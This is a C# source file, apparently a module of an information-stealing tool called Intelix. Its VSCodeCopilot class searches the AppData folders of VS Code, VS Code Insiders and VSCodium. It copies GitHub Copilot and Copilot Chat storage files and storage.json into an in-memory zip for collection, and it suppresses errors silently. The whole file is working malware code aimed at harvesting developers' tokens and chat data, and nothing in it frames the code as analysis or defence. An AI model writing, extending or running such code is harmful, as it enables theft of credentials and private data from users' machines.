using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class VSCodeCopilot : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] vscodeDirs = { "Code", "Code - Insiders", "VSCodium" };
            foreach (string vscodeDir in vscodeDirs)
            {
                string globalStorage = Path.Combine(appdata, vscodeDir, "User", "globalStorage");
                if (!Directory.Exists(globalStorage)) continue;
                string[] copilotDirs = {
                    Path.Combine(globalStorage, "github.copilot"),
                    Path.Combine(globalStorage, "github.copilot-chat"),
                    Path.Combine(globalStorage, "github.copilot-nightly")
                };
                var entry = new Counter.CounterApplications { Name = "VSCode Copilot (" + vscodeDir + ")" };
                foreach (string dir in copilotDirs)
                {
                    if (!Directory.Exists(dir)) continue;
                    foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                    {
                        if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                        try
                        {
                            string rel = "AI-Agent\\VSCodeCopilot\\" + vscodeDir + "\\" + Path.GetFileName(file);
                            zip.AddFile(rel, File.ReadAllBytes(file));
                            entry.Files.Add(file + " => " + rel);
                        }
                        catch { }
                    }
                }
                string storageDb = Path.Combine(appdata, vscodeDir, "User", "globalStorage", "storage.json");
                if (File.Exists(storageDb))
                {
                    try
                    {
                        string rel = "AI-Agent\\VSCodeCopilot\\" + vscodeDir + "\\storage.json";
                        zip.AddFile(rel, File.ReadAllBytes(storageDb));
                        entry.Files.Add(storageDb + " => " + rel);
                    }
                    catch { }
                }
                if (entry.Files.Count > 0) counter.AI.Add(entry);
            }
        }
    }
}
